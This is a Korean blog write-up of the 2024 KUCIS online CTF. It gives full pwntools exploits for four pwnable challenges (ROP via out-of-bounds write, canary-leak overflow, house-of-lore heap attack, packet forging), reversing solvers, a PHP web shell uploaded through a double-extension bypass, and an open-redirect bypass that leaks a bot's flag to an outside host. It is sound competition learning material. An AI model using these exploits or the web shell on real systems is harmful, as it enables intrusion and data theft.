---
title: "2024 12 16 2024 KUCIS 온라인 CTF Write up"
date: 2024-12-16 +0900
categories: [WRITE-UP]
tags: ['writeup', 'ctf', '2024']
image:
    path: "https://dreamhack-media.s3.amazonaws.com/ctf/69c2c484b3a3939a587bad68fa00340e8e822b28dd94b8bf21cfd033d089b243.png"
    alt: "2024 KUCIS 온라인 ctf"
    lqip: "https://dreamhack-media.s3.amazonaws.com/ctf/69c2c484b3a3939a587bad68fa00340e8e822b28dd94b8bf21cfd033d089b243.png"
---
![alt text](/assets/img/posts/2024_kucis_writeup/scoreboard.png)
_2024 KUCIS 온라인 CTF Scoreboard_

비록 규모가 작은 대회지만 지금까지 여러 CTF 참여하면서 첫 입상이자 첫 우승이네요!!
개인전이였지만 학교, 동아리 이름을 걸고 우승한거라 더 의미가 있었던 것 같습니다.
<br>
- Rank : 1st Place 🥇
- Solve : 9/10 solve (8384pts)

## Welcome-Pawn - [misc]

> **💎 509 pts / 35 solves**
> 

### Analysis

- flag를 얻기 위해서는 `EXPECTED_SEQUENCE` 와 request로 전달해준 `move_sequence` 가 같은 값을 만족해주어야 한다.
- `EXPECTED_SEQUENCE` 값은 `['f1', 'a1', 'g1']` 이므로 `moves` 매개변수에 넣어서 보내면 된다.

```python
from flask import Flask, render_template, jsonify, request
import os

app = Flask(__name__)

EXPECTED_SEQUENCE = ['f1', 'a1', 'g1']

@app.route('/')
def chess_board():
    return render_template('chess_board.html')

@app.route('/check_moves', methods=['POST'])
def check_moves():
    move_sequence = request.json.get('moves', [])
    if move_sequence[-3:] == EXPECTED_SEQUENCE:
        flag_path = os.path.join(app.root_path, 'flag.txt')
        try:
            with open(flag_path, 'r') as file:
                flag_content = file.read().strip()
            return jsonify({"flag": flag_content})
        except FileNotFoundError:
            return jsonify({"error": "Flag file not found"}), 404
    else:
        return jsonify({"message": "Incorrect move sequence"}), 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')

```

### Solve Code

```python
import requests

url = "http://host3.dreamhack.games:16903/check_moves"

data = {'moves':['f1', 'a1', 'g1']}

res = requests.post(url, json=data)

print(res.text)
```

---

## Calc - [pwnable]

> **💎 988 pts / 5 solves
> 🩸 *First Blood***

### Analysis

- index에 대한 검사가 따로 없다.
- 따라서 OOB read/write 를 할 수 있는 취약점이 존재한다.
- 해당 취약점을 이용하여 rop chain을 구성하여 exploit 하면 된다.

```c
printf("idx: ");
__isoc99_scanf("%lu", &v6);
printf("<val> <op> <val>: ");
__isoc99_scanf("%lu %c %lu", &v7, &v4, &v8);
while ( getchar() != 10 )

...

else if ( v5 == 2 )
{
  printf("idx: ");
  __isoc99_scanf("%lu", &v6);
  printf("%lu\n", v9[v6]);
}
```

### Solve Code

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
HOST, PORT = 'host3.dreamhack.games 15372'.split(' ')
BINARY = './prob'

one_gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(BINARY)
    #gdb.attach(p)

def print_addr(idx):
    p.sendlineafter(b'cmd > ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

print_addr(259)

leak = int(p.recvline().decode())
print(hex(leak))
libc_base = leak - 0x2a1ca
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f
popret = libc_base + 0x10f75b
ret = libc_base + 0x10f75c

payload = [str(ret), '+', '0']
payload = ' '.join(payload)
p.sendlineafter(b'cmd > ', b'1')
p.sendlineafter(b'idx: ', '259')
p.sendlineafter(b': ', payload)

payload = [str(popret), '+', '0']
payload = ' '.join(payload)
p.sendlineafter(b'cmd > ', b'1')
p.sendlineafter(b'idx: ', '260')
p.sendlineafter(b': ', payload)

payload = [str(binsh), '+', '0']
payload = ' '.join(payload)
p.sendlineafter(b'cmd > ', b'1')
p.sendlineafter(b'idx: ', '261')
p.sendlineafter(b': ', payload)

payload = [str(system), '+', '0']
payload = ' '.join(payload)
p.sendlineafter(b'cmd > ', b'1')
p.sendlineafter(b'idx: ', '262')
p.sendlineafter(b': ', payload)

p.sendlineafter(b'cmd > ', b'3')
p.interactive()
```

---

## Encryption Box - [pwnable]

> **💎 998 pts / 2 solves
> 🩸 *First Blood***

### Analysis

- `encrypt`
    - 데이터를 입력 값을 받고 key와 함께 암호화 진행 후 stack에 저장
- `set the key`
    - 암호화에 사용될 랜덤한 key 값을 생성하고 bss 영역에 저장
    - `/dev/urandom` 에서 랜덤한 key 값을 만듬

```c
$ ./chall
1. encrypt
2. set the key
>
```

- `buf` 에서 24바이트 buffer overflow 발생
- canary, sfp, return address 까지 overwrite 가능
- stack canary가 있기 때문에 canary leak과 공격에 필요한 가젯을 얻기 위해 libc leak 필요
- oneshot gadget을 이용해서 익스플로잇

```c
if ( dword_4030 )
{
  v5 = read(0, buf, 96uLL);       // buffer overflow
  if ( v5 <= 0 )
  {
    puts("read() error");
    exit(1);
  }
  if ( buf[v5 - 1] == 10 )
    buf[v5 - 1] = 0;
  sub_12CB(buf, v5);
  printf("enc: ");
  puts(buf);
}
```

- 데이터를 입력한 후 암호화를 해서 올바른 값이 들어가지 않는다.
- 입력한 데이터를 바탕으로 key를 얻을 수 있다.
- 암호화에 필요한 key를 얻었기 때문에 데이터 입력 시 원하는 값으로 암호화를 하는 것이 가능하다.

```c
__int64 __fastcall sub_12CB(_BYTE *buf, unsigned __int64 len)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( len <= i )
      break;
    if ( i )
      buf[i] = buf[i - 1] ^ ((sub_1290(buf[i], 3) ^ key[i % 4]) + i + 'G');
    else
      *buf = (sub_1290(*buf, 3) ^ key[0]) + 0x47;
  }
  return result;
}
```

### Solve Code

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
HOST, PORT = 'host3.dreamhack.games 24030'.split(' ')
BINARY = './chall'

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(BINARY)
    #gdb.attach(p)

def encrypt():
    p.sendlineafter('> ', b'1')
    pass

def setkey():
    p.sendlineafter(b'> ', b'2')

def find_key(buf, length, enc):
    i = 0
    key = []
    while True:
        for key_byte in range(256):
            if length <= i:
                break
            if i != 0:
                tmp = (buf[i - 1] ^ ((swap(buf[i], 3) ^ key_byte) + i + 0x47)) & 0xff
                if tmp == enc[i]:
                    key.append(key_byte)
                    buf[i] = tmp
                    break
            else:
                tmp = ((swap(buf[i], 3) ^ key_byte) + 0x47) & 0xff
                if tmp == enc[i]:
                    key.append(key_byte)
                    buf[0] = tmp
                    break
        i += 1
        if length <= i:
            break
    
    return key

                
def swap(a1, a2):
    return ((a1 << (8 - a2)) & 0xff) | ((a1 >> a2) & 0xff)

def swap_re(a1, a2):
    return (((a1 >> (8 - a2)) & 0xff) | ((a1 << a2) & 0xff)) & 0xff

def decrypt(buf, length, key):
    result = b''
    for i in range(length - 1, -1, -1):
        if i != 0:
            tmp = buf[i] ^ buf[i - 1]
            tmp = (tmp - 0x47 - i) & 0xff
            tmp = tmp ^ key[i % 4]
            tmp = swap_re(tmp, 3)
            result += tmp.to_bytes(1, byteorder='little')
        else:
            tmp = (buf[0] - 0x47) & 0xff
            tmp = tmp ^ key[0]
            tmp = swap_re(tmp, 3)
            result += tmp.to_bytes(1, byteorder='little')
              
    print('plain: ', result[::-1])
    
    return result[::-1]

libc_main_offset = 0x29d90
one_gadget = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]

setkey()

payload = 'A' * 4
p.sendlineafter(b'> ', b'1')
p.sendline(payload)

p.recvuntil(b'enc: ')
enc = p.recv(4)
print(enc)

key_list = find_key(bytearray(payload.encode()), 4, enc)
print(key_list)

key = 0
for i in range(len(key_list)):
    key = key | (key_list[i] << (i * 8))

print(hex(key))
show = '1. encrypt'

payload = b'A' * 72 + b'\n'
plain = decrypt(payload, len(payload), key_list)
p.sendlineafter(b'> ', b'1')
p.send(plain)

res = p.recvuntil(show.encode())

idx = res.find(show.encode())
canary = u64(b'\x00' + res[idx - 9: idx - 2])
print('[+] canary: ' + hex(canary))

payload = b'\xff' * 87
plain = decrypt(payload, len(payload), key_list)
p.sendline(b'1')
p.sendline(plain)

res = p.recvuntil(show.encode())
idx = res.find(show.encode())
leak = u64(res[idx - 7:idx - 1] + b'\x00' * 2)
print(hex(leak))

libc_base = leak - 0x29d90
oneshot = libc_base + one_gadget[5]
writeable = libc_base + 0x21a240

payload = b'A' * 72
payload += p64(canary)
payload += p64(writeable)
payload += p64(oneshot)
plain = decrypt(payload, len(payload), key_list)
p.sendline(b'1')
p.sendline(plain)

p.sendlineafter(b'> ', b'3')
p.interactive()
```

---

## **Receive Flag - [pwnable]**

> **💎 1000 pts / 1 solves
> 🩸 *First Blood***

### Analysis

- 해당 바이너리는 TCP 소켓 통신으로 데이터를 주고 받는다
- 데이터를 받으면 여러가지 검증로직과 암호화 과정을 거친다.
    - 이는 다 역으로 계산이 가능하다
- 모든 검증 로직을 다 통과하면 함수 하나를 호출한다.

```c
__int64 __fastcall sub_15CE(unsigned int a1, __int16 *a2)
{
  int v2; // eax

  v2 = *a2;
  if ( v2 != 0x3317 )
  {
    if ( v2 <= 0x3317 )
    {
      if ( v2 == 0x1337 )
        sub_144D(a1);
      if ( v2 == 4920 )
        sub_15BC();
    }
    exit(1);
  }
  return ((__int64 (__fastcall *)(_QWORD, __int16 *))loc_148E)(a1, a2 + 1);
}
```

- `sub_15CE()` 함수에서 `loc_148E` 호출하는데 해당 로직에서는 `open()` , `read()` , `send()` 를 통해 최종적으로 클라이언트에게 파일 내용을 전송해주는 로직을 가지고 있다.
- 모든 검증 로직을 만족하는 페이로드를 작성하고 read 할 파일 경로를 페이로드에 포함시키면 된다.

- `open()`

```c
.text:00000000000014B3                 mov     [rbp-8], rax
.text:00000000000014B7                 xor     eax, eax
.text:00000000000014B9                 mov     rax, [rbp-440h]
.text:00000000000014C0                 mov     esi, 0
.text:00000000000014C5                 mov     rdi, rax
.text:00000000000014C8                 mov     eax, 0
.text:00000000000014CD                 call    _open
```

- `read()`

```c
.text:0000000000001551                 lea     rcx, [rbp-410h]
.text:0000000000001558                 mov     eax, [rbp-424h]
.text:000000000000155E                 mov     edx, 400h
.text:0000000000001563                 mov     rsi, rcx
.text:0000000000001566                 mov     edi, eax
.text:0000000000001568                 call    _read
```

- `send()`

```c
.text:00000000000014FA                 mov     rdx, [rbp-420h]
.text:0000000000001501                 lea     rsi, [rbp-410h]
.text:0000000000001508                 mov     eax, [rbp-434h]
.text:000000000000150E                 mov     ecx, 0
.text:0000000000001513                 mov     edi, eax
.text:0000000000001515                 call    _send
```

### Solve Code

```python
from pwn import *

HOST, PORT = 'host3.dreamhack.games 8218'.split(' ')

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    pass
    
def check_1(packet, size):
    v7 = 0xffff
    i = 0
    while size != 0:
        
        size -= 1
        v2 = packet[i]
        i += 1
        v7 = (((v2 << 8) ^ v7)) & 0xffff
        for j in range(8):
            if v7 < 0x8000:
                print(hex(v7))
                v7 = (v7 * 2) & 0xffff
            else:
                v7 = ((2 * v7) ^ 0x1021) & 0xffff
    
    return v7

def check_2(heap_buf, size):
    v3 = 0xffffffff
    for i in range(size):
        v3 ^= heap_buf[i]
        for j in range(8):
            if (v3 & 1) != 0:
                v3 = ((v3 >> 1) ^ 0xEDB88320) & 0xffffffff
            else:
                v3 = (v3 >> 1) & 0xffffffff
    
    return (~v3) & 0xffffffff

payload = b'\x80\x3b\xe1\xef\xee\x12'

result = check_1(payload, 6)
print(result)

payload += result.to_bytes(2, 'little')
print(payload)

#flag_path = b'/home/bratva/dreamhack/receive_flag/deploy/flag'
flag_path = b'/home/chall/flag'
payload_heap = b'\x17\x33' + flag_path
result = check_2(payload_heap, len(payload_heap))
print(result)

payload_heap += result.to_bytes(4, 'little')
print(payload_heap)
payload += payload_heap

trailer = b'\x3f\xe6\x6e\xf8'
payload += trailer

p.send(payload)
p.interactive()
```

---

## **Small and Big Notes - [pwnable]**

> **💎 996 pts / 3 solves**
> 

### Analysis

- heap note 문제
- type에 따라 각각 small bin과 large bin의 chunk 를 할당할 수 있도록 되어 있음
- house of lore (small bin attack)을 이용하여 stack에 메모리 공간 할당
    - fake free list를 만들어줌
- ret address를 덮어 exploit

### Solve Code

```c
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']

HOST, PORT = 'host3.dreamhack.games 19630'.split(' ')
BINARY = './chall'

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(BINARY)
    #gdb.attach(p)

def write_note(typ, idx, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'? ', str(typ).encode())
    p.sendlineafter(b'? ', str(idx).encode())
    p.sendlineafter(b'? ', content)

def read_note(typ, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'? ', str(typ).encode())
    p.sendlineafter(b'? ', str(idx).encode())

def delete_note(typ, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'? ', str(typ).encode())
    p.sendlineafter(b'? ', str(idx).encode())

main_arena_offset = 0x21ace0

# libc leak
payload = b'A' * 0xf8
p.sendafter(b'> ', payload)
p.recvuntil(payload)
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - 0x21b780
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
popret = libc_base + 0x2a3e5
print('[+] libc_base:', hex(libc_base))

# stack leak
payload = b'A' * 0x158
p.sendafter(b'> ', payload)
p.recvuntil(payload)
stack = u64(p.recv(6).ljust(8, b'\x00')) - 0x180
fake_freelist = stack + 0x10 + 0x50
fake_chunk1 = stack + 0xf0 + 0x50
fake_chunk2 = stack + 0x110 + 0x50
print('[+] stack:', hex(stack))
print('[+] fake 1:', hex(fake_chunk1))
print('[+] fake 2:', hex(fake_chunk2))
print('[+] fake freelist 2:', hex(fake_freelist))

# Victim
write_note(1, 0, b'AAAA')
write_note(1, 1, b'AAAA')
write_note(1, 2, b'AAAA')

# Dummy
for i in range(3, 10):
    write_note(1, i, b'AAAA')

# Big note
write_note(2, 0, b'BBBB')

for i in range(3, 10):
    delete_note(1, i)

delete_note(1, 0)
delete_note(1, 2)

read_note(1, 2)
victim = u64(p.recvline().strip().ljust(8, b'\x00'))
read_note(1, 0)
main_arena = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(victim))
print(hex(main_arena))

write_note(2, 1, b'CCCC')

payload = b'A' * 0x60
for i in range(6):
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(fake_freelist + ((i+1) * 0x20))

payload += p64(0) * 3
payload += p64(main_arena)

print('length: ', len(payload))
payload += p64(0)
payload += p64(0)
payload += p64(victim)
payload += p64(fake_chunk2)

payload += p64(0)
payload += p64(0)
payload += p64(fake_chunk1)
payload += p64(fake_freelist)

print('length: ', hex(len(payload)))

p.sendafter(b'> ', payload)

payload2 = p64(main_arena)
payload2 += p64(fake_chunk1)
write_note(1, 0, payload2)

for i in range(10, 17):
    write_note(1, i, b'EEEE')

input()
write_note(1, 17, b'Y' * 0x10)

payload = b'A' * 0x98
payload += p64(popret + 1)
payload += p64(popret)
payload += p64(binsh)
payload += p64(system)
write_note(1, 18, payload)

p.sendlineafter(b'> ', b'4')

p.interactive()
```

---

## **easybox - [reversing]**

> **💎 911 pts / 13 solves**
> 

### Analysis

- 다음과 같은 암호화 과정을 거침
- & 연산이 섞여있어 역연산은 어렵다고 생각함.

```c
__int64 __fastcall sub_125B(int a1)
{
  int v2; // [rsp+0h] [rbp-4h]

  v2 = ((a1 | (a1 << 16)) & 0x30000FF | (((a1 | (a1 << 16)) & 0x30000FF) << 8)) & 0x300F00F;
  return ((v2 | (16 * v2)) & 0x30C30C3 | (4 * ((v2 | (16 * v2)) & 0x30C30C3))) & 0x9249249;
}
```

- Flag 포맷은 `DH{[a-z0-9]{64}}` 이므로 경우의 수가 많지 않을 것이라 생각하여 `output.txt` 파일의 데이터와 같은 결과를 내는 모든 3바이트의 문자열을 뽑아냄

```
1e4c64
0fc06a
07e52a
1f8191
1b91d8
17a42d
03f891
0fc0e4
03f462
0fc176
07e123
03f1b9
03f1ea
13b545
07e15a
03f2a7
1b9187
0fc1f8
13b06e
17a147
0bd280
1b9331
0bff87
```

### Solve Code

- 다음과 같이 flag를 뽑을 수 있음

```python
import string

table = string.ascii_lowercase + string.digits
datas = open('./output.txt', 'r').readlines()

def encrypt(a1):
    v2 = ((a1 | (a1 << 16)) & 0x30000FF | (((a1 | (a1 << 16)) & 0x30000FF) << 8)) & 0x300F00F
    return ((v2 | (16 * v2)) & 0x30C30C3 | (4 * ((v2 | (16 * v2)) & 0x30C30C3))) & 0x9249249

dic = {}
ll = []
for c in table:
    res = encrypt(ord(c))
    enc = f'{res:06x}'
    dic[enc] = c
    ll.append(enc)

print(datas[0])

int_data = int(datas[0], 16)
result = []
char_res = []
for i in ll:
    for j in ll:
        for k in ll:
            result.append(int(i, 16) | int(j, 16) * 2 | int(k, 16) * 4)
            char_res.append(dic[i] + dic[j] + dic[k])

flag = ''
for data in datas:
    for idx in range(len(result)):
        if int(data, 16) == result[idx]:
            flag += char_res[idx]

print(flag)
```

- 하지만 output.txt 의 값과 코드를 실행했을 때 결과값이 살짝 달랐음.

```bash
λ Bratva easybox → ./easybox
DH{fa2b96afd6fdc8c168dd3492dc7a1636665658ef349531eeff661ce1e8d09bf}
1e4c64
0fc06a
07e52a
1f8191
1b91d8
17a42d
03f891
0fc0e4
03f462
0fc176
07e123
03f1b9
03f1ea
13b545
07e15a
03f2a7
1b9187
0fc1f8
13b06e
17a147
0bd280
1b9331
07ffc7
```

- 총 64자이므로 끝에 한 바이트 문자만 유추하면 됨.
    - `DH{fa2b96afd6fdc8c168dd3492dc7a1636665658ef349531eeff661ce1e8d09bf9}`

```bash
λ Bratva easybox → ./easybox
DH{fa2b96afd6fdc8c168dd3492dc7a1636665658ef349531eeff661ce1e8d09bf9}
1e4c64
0fc06a
07e52a
1f8191
1b91d8
17a42d
03f891
0fc0e4
03f462
0fc176
07e123
03f1b9
03f1ea
13b545
07e15a
03f2a7
1b9187
0fc1f8
13b06e
17a147
0bd280
1b9331
0bff87
```

---

## **Ciphered Mirage - [reversing]**

> **💎 992 pts / 4 solves**
> 

### Analysis

- 바이너리 전체가 완벽하게 디컴파일 되지 않는 상태
- 입력한 문자열을 검증하여 `correct :)` 또는 `wrong :(` 을 출력하므로 문자열을 비교해주는 부분이 있을 것이라 판단
    - 바이너리 안에 `memcmp()` 가 있어서 해당 함수를 호출하는 부분을 기준으로 동적분석
    - 또는 `wrong :(` 을 출력하는 부분을 기준으로 역으로 추적

```
.text:0000000000001B9D                 lea     rcx, unk_4020
.text:0000000000001BA4                 mov     rsi, rcx
.text:0000000000001BA7                 mov     rdi, rax
.text:0000000000001BAA                 call    _memcmp
.text:0000000000001BAF                 test    eax, eax
.text:0000000000001BB1                 jnz     short loc_1BC4
.text:0000000000001BB3                 lea     rax, aCorrect   ; "correct :)"
.text:0000000000001BBA                 mov     rdi, rax
.text:0000000000001BBD                 call    _puts
.text:0000000000001BC2                 jmp     short loc_1BD3
.text:0000000000001BC4 ; ---------------------------------------------------------------------------
.text:0000000000001BC4
.text:0000000000001BC4 loc_1BC4:                               ; CODE XREF: .text:0000000000001BB1↑j
.text:0000000000001BC4                 lea     rax, aWrong     ; "wrong :("
.text:0000000000001BCB                 mov     rdi, rax
.text:0000000000001BCE                 call    _puts
```

### Solve Code

```python
from pwn import *

enc_bytes = [0xEA, 0xCD, 0x95, 0x88, 0xF9, 0x36, 0x25, 0x20, 0x76, 0x5D, 0x74, 0x7E, 0xFC, 0xE5, 0xF0, 0x77,
0x7E, 0x9C, 0x56, 0x75, 0xBF, 0xEC, 0x6A, 0xE7, 0x9A, 0xAE, 0x1C, 0x35, 0x53, 0x5B, 0x4A, 0x21,
0x1A, 0x08, 0xAC, 0x17, 0x70, 0x39, 0xC9, 0xDD, 0x05, 0x2F, 0x3E, 0xFB, 0x87, 0x62, 0x9B, 0x58,
0xE9, 0xE8, 0x5B, 0x38, 0x73, 0x04, 0x23, 0xA8, 0x20, 0x06, 0x05, 0x52, 0x70, 0x64, 0xBE, 0xE2]

def decrypt(data):
    v7 = [10, 3, 15, 1, 12, 5, 8, 7, 2, 11, 14, 9, 4, 13, 6, 0]
    result = bytearray(data)
    for i in range(4):
        v2 = data[i * 16:(i + 1) * 16]
        for j in range(16):
            result[(i * 16) + j] = v2[v7[j]]

    return bytes(result)

sbox_list= [
    0x451003cbfb12bc44, 0xde12d3ca6cc74ba7,
    0xdfaddd67fe104078, 0x4a5b3d8f9f7e0164,
    0xbf3c5be66a6a710e, 0x79ab01141dabcd9d,
    0xcd1667158dd70c61, 0xd114554b62dc6068
]

sbox = b''
for i in sbox_list:
    sbox += i.to_bytes(8, 'little')

enc = b''
for i in enc_bytes:
    enc += i.to_bytes(1, 'little')

dec = decrypt(enc)
flag = b''
for i in range(len(dec)):
    flag += (dec[i] ^ sbox[i]).to_bytes(1, 'little')

print('DH{' + flag.decode() + '}')
```

---

## **Paper Board - [web]**

> **💎 992 pts / 4 solves**
> 

### Analysis

- `preg_match()` 부분을 보면 사진 파일이나 pdf 파일을 제외한 나머지 파일은 업로드하지 못하도록 필터링을 해놓은 것 같지만, 이 부분에 취약점이 있다.
- `$extension_pattern` 과 `$original_file_name` 을 비교한다.
    - 파일 이름을 `foo.pdf.php` 나 `bar.png.php` 와 같이 업로드 하면 웹 쉘 업로드가 가능하다.
    - `.pdf` 나 `.png` 등이 있는 지만 검사하기 때문에
- 업로드된 파일은 `uniqid()` 함수에 의해서 파일 이름 앞에 랜덤한 수가 붙여져서 업로드 된다.

```php
<?php
//include 'db.php';

$title = $_POST['title'];
$content = $_POST['content'];
$file_path = "";
$original_file_name = "";

if ($_FILES["fileToUpload"]["name"]) {
    $original_file_name = basename($_FILES["fileToUpload"]["name"]);

    $file_name = pathinfo($original_file_name, PATHINFO_FILENAME);
    $file_extension = strtolower(pathinfo($original_file_name, PATHINFO_EXTENSION));
    
    $safe_file_name = uniqid() . $file_name . "." . $file_extension;
    
    $target_dir = "uploads/";
    $target_file = $target_dir . $safe_file_name;

    $extension_pattern = '/\.(pdf|jpg|jpeg|png|gif)/i';
    
    if (preg_match($extension_pattern, $original_file_name)) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $file_path = $target_file;
        } else {
            echo "Sorry, there was an error uploading your file.<br>";
            echo "Error details: " . $_FILES["fileToUpload"]["error"] . "<br>";
            exit();
        }
    } else {
        echo "Sorry, only PDF and image files are allowed.";
        exit();
    }
}

$sql = "INSERT INTO posts (title, content, file_path, original_file_name) VALUES ('$title', '$content', '$file_path', '$original_file_name')";

if ($conn->query($sql) === TRUE) {
    header("Location: index.php");
    exit();
} else {
    die("Error: " . $sql . "<br>" . $conn->error);
}

$conn->close();
?>

```

- `post.php` 페이지에 가면 파일 이름에 `.pdf` 가 있는 파일의 경우에는 file_path가 html 태그에 삽입되서 보여준다.
- 따라서 업로드된 파일 이름을 알 수 있다.
- 업로드된 웹 쉘에 접속해서 flag를 얻을 수 있다.

```php
if (preg_match('/\.pdf/i', $row["original_file_name"])) {

    if ($file_mime_type === 'application/pdf') {
        echo "<div id='pdf-viewer' class='pdfobject-container'></div>";
        echo "<script id='hidden-script'>
                document.addEventListener('DOMContentLoaded', function() {
                    PDFObject.embed('$file_path', '#pdf-viewer');
                });
            </script>";
    } else {
        echo "<div id='pdf-viewer' class='pdfobject-container' src='$file_path' >This is not a PDF file.</div>";
    }
} 
else {
    echo "<img src='image.php?file_id=" . htmlspecialchars($row["id"]) . "' alt='uploaded image' style='max-width:100%; height:auto;'>";
}
```

### Solve

- web shell
- 파일 업로드 시 filename : `exp.pdf.php`

```php
<?php system($_GET['cmd']); ?>
```

---

## Redirect - [web]

> **💎 998 pts / 2 solves**
> 

### Analysis

- 주어진 `jar` 파일을 jd-gui로 열면 user controller에 다음과 같이되어 있다
- redirect 매개변수로 전달된 데이터는 `http://` 나 `https://` 로 시작되면 `path` 가 `/` 가 된다.
    - 즉, redirect 매개변수로 전달된 페이지로 리다이렉트 하기 위해서는 위의 조건을 우회해야할 필요가 있다.

```php
@PostMapping({"/login"})
  public ModelAndView doLogin(@RequestParam String username, @RequestParam String password, @RequestParam(value = "", required = false) String redirect, HttpServletResponse response, HttpSession session) {
    try {
      UserDetails userDetails = this.userService.loadUserByUsername(username);
      if (this.passwordEncoder.matches(password, userDetails.getPassword())) {
        session.setAttribute("user", new UserLoginDTO(username, null));
        if (redirect != "") {
          String path = redirect.trim();
          if (path.startsWith("http://") || path.startsWith("https://")) {
            String host = UriComponentsBuilder.fromUriString(path).build().getHost();
            for (String allowedHost : ALLOWED_HOSTS) {
              if (host.equals(allowedHost))
                break; 
              path = "/";
            } 
          } 
```

- report 기능을 통해 bot을 동작시킬 수 있다.
- bot은  `redirect` 매개변수로 전달된 주소에 flag를 포함시켜서 접근한다.

```php
const bot = async (input) => {

  try {
    const browser = await puppeteer.launch({
      executablePath: "/usr/bin/google-chrome-stable",
      headless: "new",
      args: ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--ignore-certificate-errors"],
    })
  
    const page = await browser.newPage();

    await page.goto(`${URL}/user/login?redirect=${input}${encodeURIComponent(encodeURIComponent(FLAG))}`, { timeout: 3000, waitUntil: 'domcontentloaded' });
    await page.evaluate((id, password) => {
      document.querySelector("#username").value = id;
      document.querySelector("#password").value = password;
      document.querySelector("#submit").click();
    }, ADMIN_ID, ADMIN_PASSWORD)
```

### Solve

- `https:/` 로 검사 우회

```
/user/login/?redirect=https:/gfmolfd.request.dreamhack.games/
```